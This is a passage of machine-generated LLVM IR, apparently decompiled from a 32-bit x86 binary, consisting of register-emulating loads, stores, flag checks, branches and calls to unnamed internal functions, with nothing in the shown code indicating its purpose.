  %v3_8049bb4 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

dec_label_pc_8049bbc:                             ; preds = %dec_label_pc_8049b96, %dec_label_pc_8049b86, %dec_label_pc_8049ba7
  %v0_8049bbc = phi i32 [ %v1_8049b9f, %dec_label_pc_8049b96 ], [ %v1_8049b8f, %dec_label_pc_8049b86 ], [ %v1_8049bb9, %dec_label_pc_8049ba7 ]
  %v0_8049bbf = load i32, i32* @esi, align 4
  store i32 %v0_8049bbf, i32* %eax.global-to-local, align 4
  %v1_8049bc1 = add i32 %v0_8049bbc, 20900
  %v2_8049bc1 = inttoptr i32 %v1_8049bc1 to i32*
  %v3_8049bc1 = load i32, i32* %v2_8049bc1, align 4
  %v2_8049bc8 = add i32 %v0_8049bbf, 1
  %v1_8049bca = add i32 %v2_8049bc8, %v3_8049bc1
  %v8_8049bca = icmp eq i32 %v1_8049bca, 0
  store i1 %v8_8049bca, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bca, i32* %eax.global-to-local, align 4
  %v2_8049bcb = add i32 %v0_8049bbc, -16
  %v3_8049bcb = inttoptr i32 %v2_8049bcb to i32*
  store i32 %v1_8049bca, i32* %v3_8049bcb, align 4
  %v2_8049bcc = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049bcc, i32* @eax, align 4
  %v0_8049bd1 = load i32, i32* @esp, align 4
  %v1_8049bd1 = add i32 %v0_8049bd1, 16
  %v1_8049bd4 = add i32 %v2_8049bcc, -255
  %v6_8049bd4 = sub i32 254, %v2_8049bcc
  %v7_8049bd4 = and i32 %v6_8049bd4, %v2_8049bcc
  %v8_8049bd4 = icmp slt i32 %v7_8049bd4, 0
  %v9_8049bd4 = icmp eq i32 %v1_8049bd4, 0
  store i1 %v9_8049bd4, i1* %zf.global-to-local, align 1
  %v10_8049bd4 = icmp slt i32 %v1_8049bd4, 0
  %v3_8049bd9 = icmp eq i1 %v10_8049bd4, %v8_8049bd4
  %v4_8049bd9 = icmp eq i1 %v9_8049bd4, false
  %v5_8049bd9 = and i1 %v4_8049bd9, %v3_8049bd9
  br i1 %v5_8049bd9, label %dec_label_pc_804949f, label %dec_label_pc_8049bdf

dec_label_pc_8049bdf:                             ; preds = %dec_label_pc_8049bbc
  %v1_8049bdf = add i32 %v0_8049bd1, 92
  %v2_8049bdf = inttoptr i32 %v1_8049bdf to i32*
  %v3_8049bdf = load i32, i32* %v2_8049bdf, align 4
  store i32 %v3_8049bdf, i32* %ebx.global-to-local, align 4
  %v0_8049be3 = load i32, i32* @edi, align 4
  %v2_8049be3 = add i32 %v0_8049bd1, 12
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v0_8049be4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049be4 = add i32 %v0_8049be4, 533
  %v9_8049be4 = icmp eq i32 %v1_8049be4, 0
  store i1 %v9_8049be4, i1* %zf.global-to-local, align 1
  store i32 %v1_8049be4, i32* @ebx, align 4
  %v0_8049bea = load i32, i32* @edi, align 4
  %v2_8049bea = add i32 %v0_8049bd1, 8
  %v3_8049bea = inttoptr i32 %v2_8049bea to i32*
  store i32 %v0_8049bea, i32* %v3_8049bea, align 4
  %v1_8049beb = add i32 %v0_8049bd1, 4
  %v2_8049beb = inttoptr i32 %v1_8049beb to i32*
  store i32 255, i32* %v2_8049beb, align 4
  %v0_8049bf0 = load i32, i32* @ebx, align 4
  %v3_8049bf0 = inttoptr i32 %v0_8049bd1 to i32*
  store i32 %v0_8049bf0, i32* %v3_8049bf0, align 4
  %v2_8049bf1 = call i32 @function_8051ce0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = inttoptr i32 %v0_8049bf6 to i32*
  %v2_8049bf6 = load i32, i32* %v1_8049bf6, align 4
  store i32 %v2_8049bf6, i32* %ecx.global-to-local, align 4
  %v0_8049bf7 = load i32, i32* @esi, align 4
  store i32 %v0_8049bf7, i32* %eax.global-to-local, align 4
  %v1_8049bf9 = add i32 %v0_8049bf6, 20916
  %v2_8049bf9 = inttoptr i32 %v1_8049bf9 to i32*
  %v3_8049bf9 = load i32, i32* %v2_8049bf9, align 4
  store i32 %v3_8049bf9, i32* %edx.global-to-local, align 4
  %v2_8049c00 = add i32 %v0_8049bf7, 1
  %v1_8049c02 = add i32 %v2_8049c00, %v3_8049bf9
  %v8_8049c02 = icmp eq i32 %v1_8049c02, 0
  store i1 %v8_8049c02, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c02, i32* %eax.global-to-local, align 4
  store i32 %v1_8049c02, i32* %v1_8049bf6, align 4
  %v2_8049c04 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049c04, i32* %eax.global-to-local, align 4
  %v0_8049c09 = load i32, i32* @esp, align 4
  %v1_8049c09 = add i32 %v0_8049c09, 16
  %v1_8049c0c = icmp eq i32 %v2_8049c04, 0
  store i1 %v1_8049c0c, i1* %zf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v2_8049c04, 1
  br i1 %tmp150, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049c14:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049bdf
  %v1_8049c14 = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049c09, %dec_label_pc_8049bdf ]
  %v0_8049c14 = phi i32 [ %v2_8049ccd, %dec_label_pc_8049cbd ], [ %v2_8049c04, %dec_label_pc_8049bdf ]
  %v2_8049c14 = add i32 %v1_8049c14, -4
  %v3_8049c14 = inttoptr i32 %v2_8049c14 to i32*
  store i32 %v0_8049c14, i32* %v3_8049c14, align 4
  %v0_8049c15 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049c15 = add i32 %v1_8049c14, -8
  %v3_8049c15 = inttoptr i32 %v2_8049c15 to i32*
  store i32 %v0_8049c15, i32* %v3_8049c15, align 4
  %v1_8049c16 = add i32 %v1_8049c14, 20900
  %v2_8049c16 = inttoptr i32 %v1_8049c16 to i32*
  %v3_8049c16 = load i32, i32* %v2_8049c16, align 4
  %v0_8049c1d = load i32, i32* @esi, align 4
  %v2_8049c1d = add i32 %v0_8049c1d, %v3_8049c16
  %v12_8049c1d = icmp eq i32 %v2_8049c1d, 0
  store i1 %v12_8049c1d, i1* %zf.global-to-local, align 1
  %v1_8049c1f = add i32 %v2_8049c1d, 1
  store i32 %v1_8049c1f, i32* %eax.global-to-local, align 4
  %v2_8049c22 = add i32 %v1_8049c14, -12
  %v3_8049c22 = inttoptr i32 %v2_8049c22 to i32*
  store i32 %v1_8049c1f, i32* %v3_8049c22, align 4
  %v0_8049c23 = load i32, i32* @ebx, align 4
  %v2_8049c23 = add i32 %v1_8049c14, -16
  %v3_8049c23 = inttoptr i32 %v2_8049c23 to i32*
  store i32 %v0_8049c23, i32* %v3_8049c23, align 4
  %v3_8049c24 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049c24, i32* %eax.global-to-local, align 4
  %v0_8049c29 = load i32, i32* @esp, align 4
  %v1_8049c29 = add i32 %v0_8049c29, 16
  %v6_8049c29 = icmp eq i32 %v1_8049c29, 0
  store i1 %v6_8049c29, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804949f

dec_label_pc_8049c31:                             ; preds = %dec_label_pc_80497f0
  %v1_8049c31 = add i32 %v0_80497e2, 108
  %v2_8049c31 = inttoptr i32 %v1_8049c31 to i32*
  %v3_8049c31 = load i32, i32* %v2_8049c31, align 4
  store i32 %v3_8049c31, i32* %ecx.global-to-local, align 4
  %v1_8049c35 = add i32 %v3_8049c31, -1448
  %v2_8049c35 = inttoptr i32 %v1_8049c35 to i8*
  %v3_8049c35 = load i8, i8* %v2_8049c35, align 1
  %v4_8049c35 = icmp eq i8 %v3_8049c35, 0
  store i1 %v4_8049c35, i1* %zf.global-to-local, align 1
  br i1 %v4_8049c35, label %dec_label_pc_8048d91, label %dec_label_pc_8049c42

dec_label_pc_8049c42:                             ; preds = %dec_label_pc_8049c31
  store i8 1, i8* %v2_8049c35, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049a77
  %v2_8049c4e = add i32 %v0_8049aa9, 12
  %v3_8049c4e = inttoptr i32 %v2_8049c4e to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4e, align 4
  %v2_8049c4f = add i32 %v0_8049aa9, 8
  %v3_8049c4f = inttoptr i32 %v2_8049c4f to i32*
  store i32 %v0_8049aa4, i32* %v3_8049c4f, align 4
  %v1_8049c50 = add i32 %v0_8049aa9, 4
  %v2_8049c50 = inttoptr i32 %v1_8049c50 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_8054b14.5 to i32), i32* %v2_8049c50, align 4
  %v0_8049c55 = load i32, i32* @ebx, align 4
  %v3_8049c55 = inttoptr i32 %v0_8049aa9 to i32*
  store i32 %v0_8049c55, i32* %v3_8049c55, align 4
  %v0_8049c56 = call i32 @function_8051fc0()
  store i32 %v0_8049c56, i32* %eax.global-to-local, align 4
  %v0_8049c5b = load i32, i32* @esp, align 4
  %v3_8049c5e = trunc i32 %v0_8049c56 to i8
  %v4_8049c5e = icmp eq i8 %v3_8049c5e, 0
  store i1 %v4_8049c5e, i1* %zf.global-to-local, align 1
  %v1_8049c60 = icmp eq i1 %v4_8049c5e, false
  br i1 %v1_8049c60, label %dec_label_pc_8049ab4, label %dec_label_pc_8049c66

dec_label_pc_8049c66:                             ; preds = %dec_label_pc_8049c4e
  %v1_8049c66 = add i32 %v0_8049c5b, 120
  %v2_8049c66 = inttoptr i32 %v1_8049c66 to i32*
  %v3_8049c66 = load i32, i32* %v2_8049c66, align 4
  %v4_8049c66 = load i32, i32* @esi, align 4
  %v5_8049c66 = sub i32 %v3_8049c66, %v4_8049c66
  %v11_8049c66 = xor i32 %v4_8049c66, %v3_8049c66
  %v12_8049c66 = xor i32 %v5_8049c66, %v3_8049c66
  %v13_8049c66 = and i32 %v12_8049c66, %v11_8049c66
  %v14_8049c66 = icmp slt i32 %v13_8049c66, 0
  %v15_8049c66 = icmp eq i32 %v5_8049c66, 0
  store i1 %v15_8049c66, i1* %zf.global-to-local, align 1
  %v16_8049c66 = icmp slt i32 %v5_8049c66, 0
  %v1_8049c6a = add i32 %v0_8049c5b, 108
  %v2_8049c6a = inttoptr i32 %v1_8049c6a to i32*
  %v3_8049c6a = load i32, i32* %v2_8049c6a, align 4
  store i32 %v3_8049c6a, i32* %ecx.global-to-local, align 4
  %v3_8049c6e = icmp eq i1 %v16_8049c66, %v14_8049c66
  %v4_8049c6e = icmp eq i1 %v15_8049c66, false
  %v5_8049c6e = and i1 %v4_8049c6e, %v3_8049c6e
  %v6_8049c6e = zext i1 %v5_8049c6e to i32
  %v8_8049c6e = and i32 %v0_8049c56, -256
  %v9_8049c6e = or i32 %v6_8049c6e, %v8_8049c6e
  %v2_8049c71 = mul i32 %v9_8049c6e, 8
  %v3_8049c71 = add nsw i32 %v9_8049c6e, 1
  %v4_8049c71 = add i32 %v3_8049c71, %v2_8049c71
  store i32 %v4_8049c71, i32* %eax.global-to-local, align 4
  %v1_8049c75 = trunc i32 %v4_8049c71 to i8
  %v3_8049c75 = add i32 %v3_8049c6a, -1448
  %v4_8049c75 = inttoptr i32 %v3_8049c75 to i8*
  store i8 %v1_8049c75, i8* %v4_8049c75, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049c80:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5b
  %v0_8049c80 = phi i32 [ %v0_8049b52, %dec_label_pc_8049b5b ], [ %v0_8049b80185, %dec_label_pc_8049b6c ]
  %v1_8049c80 = inttoptr i32 %v0_8049c80 to i8*
  store i8 0, i8* %v1_8049c80, align 1
  br label %dec_label_pc_8049b86

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049496
  %v1_8049c88 = add i32 %v0_804948a, 92
  %v2_8049c88 = inttoptr i32 %v1_8049c88 to i32*
  %v3_8049c88 = load i32, i32* %v2_8049c88, align 4
  store i32 %v3_8049c88, i32* %ebx.global-to-local, align 4
  %v0_8049c8c = load i32, i32* @ebp, align 4
  %v2_8049c8c = add i32 %v0_804948a, 12
  %v3_8049c8c = inttoptr i32 %v2_8049c8c to i32*
  store i32 %v0_8049c8c, i32* %v3_8049c8c, align 4
  %v0_8049c8d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049c8d = add i32 %v0_8049c8d, 533
  %v9_8049c8d = icmp eq i32 %v1_8049c8d, 0
  store i1 %v9_8049c8d, i1* %zf.global-to-local, align 1
  store i32 %v1_8049c8d, i32* @ebx, align 4
  %v0_8049c93 = load i32, i32* @ebp, align 4
  %v2_8049c93 = add i32 %v0_804948a, 8
  %v3_8049c93 = inttoptr i32 %v2_8049c93 to i32*
  store i32 %v0_8049c93, i32* %v3_8049c93, align 4
  %v1_8049c94 = add i32 %v0_804948a, 4
  %v2_8049c94 = inttoptr i32 %v1_8049c94 to i32*
  store i32 255, i32* %v2_8049c94, align 4
  %v0_8049c99 = load i32, i32* @ebx, align 4
  %v3_8049c99 = inttoptr i32 %v0_804948a to i32*
  store i32 %v0_8049c99, i32* %v3_8049c99, align 4
  %v2_8049c9a = call i32 @function_8051ce0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049c9a, i32* %eax.global-to-local, align 4
  %v0_8049c9f = load i32, i32* @esp, align 4
  %v1_8049c9f = inttoptr i32 %v0_8049c9f to i32*
  %v2_8049c9f = load i32, i32* %v1_8049c9f, align 4
  store i32 %v2_8049c9f, i32* @edi, align 4
  %v0_8049ca0 = load i32, i32* @esi, align 4
  store i32 %v0_8049ca0, i32* %eax.global-to-local, align 4
  %v1_8049ca2 = add i32 %v0_8049c9f, 20916
  %v2_8049ca2 = inttoptr i32 %v1_8049ca2 to i32*
  %v3_8049ca2 = load i32, i32* %v2_8049ca2, align 4
  store i32 %v3_8049ca2, i32* %ecx.global-to-local, align 4
  %v2_8049ca9 = add i32 %v0_8049ca0, 1
  %v1_8049cab = add i32 %v2_8049ca9, %v3_8049ca2
  %v8_8049cab = icmp eq i32 %v1_8049cab, 0
  store i1 %v8_8049cab, i1* %zf.global-to-local, align 1
  store i32 %v1_8049cab, i32* %eax.global-to-local, align 4
  store i32 %v1_8049cab, i32* %v1_8049c9f, align 4
  %v2_8049cad = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049cad, i32* %eax.global-to-local, align 4
  %v0_8049cb2 = load i32, i32* @esp, align 4
  %v1_8049cb2 = add i32 %v0_8049cb2, 16
  %v1_8049cb5 = icmp eq i32 %v2_8049cad, 0
  store i1 %v1_8049cb5, i1* %zf.global-to-local, align 1
  %tmp151 = icmp slt i32 %v2_8049cad, 1
  br i1 %tmp151, label %dec_label_pc_804949f, label %dec_label_pc_8049cbd

dec_label_pc_8049cbd:                             ; preds = %dec_label_pc_8049c88
  %v0_8049cc0 = load i32, i32* @esi, align 4
  store i32 %v0_8049cc0, i32* %eax.global-to-local, align 4
  %v1_8049cc2 = add i32 %v0_8049cb2, 20916
  %v2_8049cc2 = inttoptr i32 %v1_8049cc2 to i32*
  %v3_8049cc2 = load i32, i32* %v2_8049cc2, align 4
  store i32 %v3_8049cc2, i32* %edx.global-to-local, align 4
  %v2_8049cc9 = add i32 %v0_8049cc0, 1
  %v1_8049ccb = add i32 %v2_8049cc9, %v3_8049cc2
  %v8_8049ccb = icmp eq i32 %v1_8049ccb, 0
  store i1 %v8_8049ccb, i1* %zf.global-to-local, align 1
  store i32 %v1_8049ccb, i32* %eax.global-to-local, align 4
  %v3_8049ccc = inttoptr i32 %v0_8049cb2 to i32*
  store i32 %v1_8049ccb, i32* %v3_8049ccc, align 4
  %v2_8049ccd = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049ccd, i32* %eax.global-to-local, align 4
  %v0_8049cd2 = load i32, i32* @esp, align 4
  %v1_8049cd2 = add i32 %v0_8049cd2, 16
  %v1_8049cd5 = add i32 %v2_8049ccd, -255
  %v6_8049cd5 = sub i32 254, %v2_8049ccd
  %v7_8049cd5 = and i32 %v6_8049cd5, %v2_8049ccd
  %v8_8049cd5 = icmp slt i32 %v7_8049cd5, 0
  %v9_8049cd5 = icmp eq i32 %v1_8049cd5, 0
  store i1 %v9_8049cd5, i1* %zf.global-to-local, align 1
  %v10_8049cd5 = icmp slt i32 %v1_8049cd5, 0
  %v3_8049cda = icmp eq i1 %v10_8049cd5, %v8_8049cd5
  %v4_8049cda = icmp eq i1 %v9_8049cd5, false
  %v5_8049cda = and i1 %v4_8049cda, %v3_8049cda
  br i1 %v5_8049cda, label %dec_label_pc_804949f, label %dec_label_pc_8049c14

dec_label_pc_8049ce5:                             ; preds = %dec_label_pc_8049ec7, %dec_label_pc_8049eb6
  %v0_8049ce5 = phi i32 [ %v0_8049eac, %dec_label_pc_8049eb6 ], [ %v0_8049edb209, %dec_label_pc_8049ec7 ]
  %v1_8049ce5 = inttoptr i32 %v0_8049ce5 to i8*
  store i8 0, i8* %v1_8049ce5, align 1
  br label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge, %dec_label_pc_8049e86, %dec_label_pc_8049ce5
  %v0_8049ce8 = load i32, i32* @esp, align 4
  %v9_8049ce8 = icmp eq i32 %v0_8049ce8, 12
  store i1 %v9_8049ce8, i1* %zf.global-to-local, align 1
  %v0_8049ceb = load i32, i32* @ebx, align 4
  %v2_8049ceb = add i32 %v0_8049ce8, -16
  %v3_8049ceb = inttoptr i32 %v2_8049ceb to i32*
  store i32 %v0_8049ceb, i32* %v3_8049ceb, align 4
  %v2_8049cec = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049cec, i32* %eax.global-to-local, align 4
  %v0_8049cf1 = load i32, i32* @esp, align 4
  %v1_8049cf1 = add i32 %v0_8049cf1, 16
  %v1_8049cf4 = icmp eq i32 %v2_8049cec, 0
  store i1 %v1_8049cf4, i1* %zf.global-to-local, align 1
  %tmp152 = icmp slt i32 %v2_8049cec, 1
  br i1 %tmp152, label %dec_label_pc_8049d1e, label %dec_label_pc_8049cf8

dec_label_pc_8049cf8:                             ; preds = %dec_label_pc_8049ce8
  %v9_8049cf8 = icmp eq i32 %v0_8049cf1, -4
  store i1 %v9_8049cf8, i1* %zf.global-to-local, align 1
  %v0_8049cfb = load i32, i32* @ebx, align 4
  %v3_8049cfb = inttoptr i32 %v0_8049cf1 to i32*
  store i32 %v0_8049cfb, i32* %v3_8049cfb, align 4
  %v2_8049cfc = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049cfc, i32* %eax.global-to-local, align 4
  %v0_8049d01 = load i32, i32* @esp, align 4
  %v1_8049d01 = add i32 %v0_8049d01, 16
  %v1_8049d04 = add i32 %v2_8049cfc, -127
  %v6_8049d04 = sub i32 126, %v2_8049cfc
  %v7_8049d04 = and i32 %v6_8049d04, %v2_8049cfc
  %v8_8049d04 = icmp slt i32 %v7_8049d04, 0
  %v9_8049d04 = icmp eq i32 %v1_8049d04, 0
  store i1 %v9_8049d04, i1* %zf.global-to-local, align 1
  %v10_8049d04 = icmp slt i32 %v1_8049d04, 0
  %v3_8049d07 = icmp eq i1 %v10_8049d04, %v8_8049d04
  %v4_8049d07 = icmp eq i1 %v9_8049d04, false
  %v5_8049d07 = and i1 %v4_8049d07, %v3_8049d07
  br i1 %v5_8049d07, label %dec_label_pc_8049d1e, label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cf8
  %v2_8049d09 = add i32 %v0_8049d01, 12
  %v3_8049d09 = inttoptr i32 %v2_8049d09 to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d09, align 4
  %v2_8049d0a = add i32 %v0_8049d01, 8
  %v3_8049d0a = inttoptr i32 %v2_8049d0a to i32*
  store i32 %v2_8049cfc, i32* %v3_8049d0a, align 4
  %v0_8049d0b = load i32, i32* @ebx, align 4
  %v2_8049d0b = add i32 %v0_8049d01, 4
  %v3_8049d0b = inttoptr i32 %v2_8049d0b to i32*
  store i32 %v0_8049d0b, i32* %v3_8049d0b, align 4
  %v1_8049d0c = add i32 %v0_8049d01, 92
  %v2_8049d0c = inttoptr i32 %v1_8049d0c to i32*
  %v3_8049d0c = load i32, i32* %v2_8049d0c, align 4
  %v1_8049d10 = add i32 %v3_8049d0c, 789
  %v9_8049d10 = icmp eq i32 %v1_8049d10, 0
  store i1 %v9_8049d10, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d10, i32* %eax.global-to-local, align 4
  %v3_8049d15 = inttoptr i32 %v0_8049d01 to i32*
  store i32 %v1_8049d10, i32* %v3_8049d15, align 4
  %v3_8049d16 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d16, i32* %eax.global-to-local, align 4
  %v0_8049d1b = load i32, i32* @esp, align 4
  %v1_8049d1b = add i32 %v0_8049d1b, 16
  %v6_8049d1b = icmp eq i32 %v1_8049d1b, 0
  store i1 %v6_8049d1b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049cf8, %dec_label_pc_8049ce8, %dec_label_pc_8049a40, %dec_label_pc_8049d09
  %v0_8049d1e = phi i32 [ %v1_8049d01, %dec_label_pc_8049cf8 ], [ %v1_8049cf1, %dec_label_pc_8049ce8 ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d1b, %dec_label_pc_8049d09 ]
  %v0_8049d21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d21, i32* %eax.global-to-local, align 4
  %v1_8049d23 = add i32 %v0_8049d1e, 20900
  %v2_8049d23 = inttoptr i32 %v1_8049d23 to i32*
  %v3_8049d23 = load i32, i32* %v2_8049d23, align 4
  store i32 %v3_8049d23, i32* @ebp, align 4
  %v2_8049d2a = add i32 %v0_8049d21, 1
  %v1_8049d2c = add i32 %v2_8049d2a, %v3_8049d23
  %v8_8049d2c = icmp eq i32 %v1_8049d2c, 0
  store i1 %v8_8049d2c, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d2c, i32* %eax.global-to-local, align 4
  %v2_8049d2d = add i32 %v0_8049d1e, -16
  %v3_8049d2d = inttoptr i32 %v2_8049d2d to i32*
  store i32 %v1_8049d2c, i32* %v3_8049d2d, align 4
  %v2_8049d2e = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049d2e, i32* @eax, align 4
  %v0_8049d33 = load i32, i32* @esp, align 4
  %v1_8049d33 = add i32 %v0_8049d33, 16
  %v1_8049d36 = add i32 %v2_8049d2e, -255
  %v6_8049d36 = sub i32 254, %v2_8049d2e
  %v7_8049d36 = and i32 %v6_8049d36, %v2_8049d2e
  %v8_8049d36 = icmp slt i32 %v7_8049d36, 0
  %v9_8049d36 = icmp eq i32 %v1_8049d36, 0
  store i1 %v9_8049d36, i1* %zf.global-to-local, align 1
  %v10_8049d36 = icmp slt i32 %v1_8049d36, 0
  %v3_8049d3b = icmp eq i1 %v10_8049d36, %v8_8049d36
  %v4_8049d3b = icmp eq i1 %v9_8049d36, false
  %v5_8049d3b = and i1 %v4_8049d3b, %v3_8049d3b
  br i1 %v5_8049d3b, label %dec_label_pc_8049a49, label %dec_label_pc_8049d41

dec_label_pc_8049d41:                             ; preds = %dec_label_pc_8049d1e
  %v1_8049d41 = add i32 %v0_8049d33, 92
  %v2_8049d41 = inttoptr i32 %v1_8049d41 to i32*
  %v3_8049d41 = load i32, i32* %v2_8049d41, align 4
  store i32 %v3_8049d41, i32* %esi.global-to-local, align 4
  %v0_8049d45 = load i32, i32* @edi, align 4
  %v2_8049d45 = add i32 %v0_8049d33, 12
  %v3_8049d45 = inttoptr i32 %v2_8049d45 to i32*
  store i32 %v0_8049d45, i32* %v3_8049d45, align 4
  %v0_8049d46 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049d46 = add i32 %v0_8049d46, 533
  %v9_8049d46 = icmp eq i32 %v1_8049d46, 0
  store i1 %v9_8049d46, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d46, i32* @esi, align 4
  %v0_8049d4c = load i32, i32* @edi, align 4
  %v2_8049d4c = add i32 %v0_8049d33, 8
  %v3_8049d4c = inttoptr i32 %v2_8049d4c to i32*
  store i32 %v0_8049d4c, i32* %v3_8049d4c, align 4
  %v1_8049d4d = add i32 %v0_8049d33, 4
  %v2_8049d4d = inttoptr i32 %v1_8049d4d to i32*
  store i32 255, i32* %v2_8049d4d, align 4
  %v0_8049d52 = load i32, i32* @esi, align 4
  %v3_8049d52 = inttoptr i32 %v0_8049d33 to i32*
  store i32 %v0_8049d52, i32* %v3_8049d52, align 4
  %v2_8049d53 = call i32 @function_8051ce0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8049d53, i32* %eax.global-to-local, align 4
  %v0_8049d58 = load i32, i32* @esp, align 4
  %v1_8049d58 = inttoptr i32 %v0_8049d58 to i32*
  %v2_8049d58 = load i32, i32* %v1_8049d58, align 4
  store i32 %v2_8049d58, i32* %ecx.global-to-local, align 4
  %v0_8049d59 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d59, i32* %eax.global-to-local, align 4
  %v1_8049d5b = add i32 %v0_8049d58, 20916
  %v2_8049d5b = inttoptr i32 %v1_8049d5b to i32*
  %v3_8049d5b = load i32, i32* %v2_8049d5b, align 4
  store i32 %v3_8049d5b, i32* %edx.global-to-local, align 4
  %v2_8049d62 = add i32 %v0_8049d59, 1
  %v1_8049d64 = add i32 %v2_8049d62, %v3_8049d5b
  %v8_8049d64 = icmp eq i32 %v1_8049d64, 0
  store i1 %v8_8049d64, i1* %zf.global-to-local, align 1
  store i32 %v1_8049d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8049d64, i32* %v1_8049d58, align 4
  %v2_8049d66 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049d66, i32* %eax.global-to-local, align 4
  %v0_8049d6b = load i32, i32* @esp, align 4
  %v1_8049d6b = add i32 %v0_8049d6b, 16
  %v1_8049d6e = icmp eq i32 %v2_8049d66, 0
  store i1 %v1_8049d6e, i1* %zf.global-to-local, align 1
  %tmp153 = icmp slt i32 %v2_8049d66, 1
  br i1 %tmp153, label %dec_label_pc_8049a49, label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d41
  %v0_8049d76 = load i32, i32* @ebp, align 4
  %v2_8049d76 = add i32 %v0_8049d6b, 12
  %v3_8049d76 = inttoptr i32 %v2_8049d76 to i32*
  store i32 %v0_8049d76, i32* %v3_8049d76, align 4
  %v0_8049d77 = load i32, i32* @ebp, align 4
  %v2_8049d77 = add i32 %v0_8049d6b, 8
  %v3_8049d77 = inttoptr i32 %v2_8049d77 to i32*
  store i32 %v0_8049d77, i32* %v3_8049d77, align 4
  %v1_8049d78 = add i32 %v0_8049d6b, 20916
  %v2_8049d78 = inttoptr i32 %v1_8049d78 to i32*
  %v3_8049d78 = load i32, i32* %v2_8049d78, align 4
  store i32 %v3_8049d78, i32* @edi, align 4
  %v0_8049d7f = load i32, i32* @ebx, align 4
  %v2_8049d7f = add i32 %v0_8049d7f, %v3_8049d78
  %v12_8049d7f = icmp eq i32 %v2_8049d7f, 0
  store i1 %v12_8049d7f, i1* %zf.global-to-local, align 1
  store i32 %v2_8049d7f, i32* @ebx, align 4
  %v1_8049d81 = add i32 %v2_8049d7f, 1
  store i32 %v1_8049d81, i32* %eax.global-to-local, align 4
  %v2_8049d84 = add i32 %v0_8049d6b, 4
  %v3_8049d84 = inttoptr i32 %v2_8049d84 to i32*
  store i32 %v1_8049d81, i32* %v3_8049d84, align 4
  %v0_8049d85 = load i32, i32* @esi, align 4
  %v3_8049d85 = inttoptr i32 %v0_8049d6b to i32*
  store i32 %v0_8049d85, i32* %v3_8049d85, align 4
  %v3_8049d86 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049d86, i32* %eax.global-to-local, align 4
  %v0_8049d8b = load i32, i32* @esp, align 4
  %v1_8049d8b = add i32 %v0_8049d8b, 16
  %v6_8049d8b = icmp eq i32 %v1_8049d8b, 0
  store i1 %v6_8049d8b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049a49

dec_label_pc_8049d93:                             ; preds = %dec_label_pc_8049b1d
  %v0_8049d93 = load i32, i32* @esp, align 4
  %v1_8049d93 = add i32 %v0_8049d93, 20900
  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
